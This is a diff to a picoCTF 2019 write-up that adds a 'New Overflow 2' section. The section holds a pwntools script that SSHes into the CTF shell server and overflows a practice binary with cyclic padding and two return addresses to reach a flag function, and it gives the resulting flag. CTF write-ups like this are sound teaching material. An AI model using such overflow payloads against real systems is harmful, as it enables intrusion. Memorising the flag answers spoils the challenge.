@@ -7,7 +7,8 @@
 | ------- | -------- | ------ | ------- | -------- | ------ | 
 | [Handy Shellcode](#handyshellcode) | Binary Exploitation | 50 | [Overflow 0](#overflow0) | Binary Exploitation | 100 |
 | [Slippery Shellcode](#slipperyshellcode) | Binary Exploitation | 200 | [Overflow 1](#overflow1) | Binary Exploitation | 150 |
-|  [New Overflow](#newoverflow) | Binary Exploitation | 200 | [Overflow 2](#overflow2) | Binary Exploitation | 250 |
+| [New Overflow](#newoverflow) | Binary Exploitation | 200 | [Overflow 2](#overflow2) | Binary Exploitation | 250 |
+| [New Overflow2](#newoverflow2) | Binary Exploitation | 250 | Canary | Binary Exploitation | 300 |
 ***
 
 ## HANDY SHELLCODE <a name="handyshellcode"></a>
@@ -263,6 +264,53 @@ print io.recvall()
 ~~~
 
 **Flag:** *picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_7a154fef}*
+
+[Return to Top](#picoctf19)
+***
+
+##  New Overvflow<a name="newoverflow2"></a>
+
+> ### Problem
+>> Now try overwriting arguments. Can you get the flag from this program? You can find it 
+>> in /problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446 on the shell server. 
+>> [(Source)](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/Pico_CTF(2019)/Source/newoverflow2.md#newoverflow2source1)
+
+> ### Solution
+>>
+>>
+>>
+~~~python
+#!/usr/bin/python
+
+from pwn import *
+
+# elf = context.binary = ELF('vuln')
+context.update(os='linux', arch='amd64')
+context.log_level = 'info'
+
+s = ssh(host='2019shell1.picoctf.com', user='User', password='Pa$$word')
+
+io = s.process('vuln',cwd='/problems/newoverflow-2_2_1428488532921ee33e0ceb92267e30a7')
+
+# io = process(elf.path)
+
+padding = cyclic(72)          # location of pattern match @ rsp
+win = p64(0x004009bc)         # location of main function
+flag = p64(0x0040084d)        # location of flag function
+
+payload = padding
+payload += win
+payload += flag
+
+
+# gdb.attach(io, gdbscript = 'b* main')
+
+io.sendline(payload)
+
+print io.recvall()
+~~~
+
+**Flag:** *picoCTF{r0p_1t_d0nT_st0p_1t_64362a2b}*
 
 [Return to Top](#picoctf19)
 ***
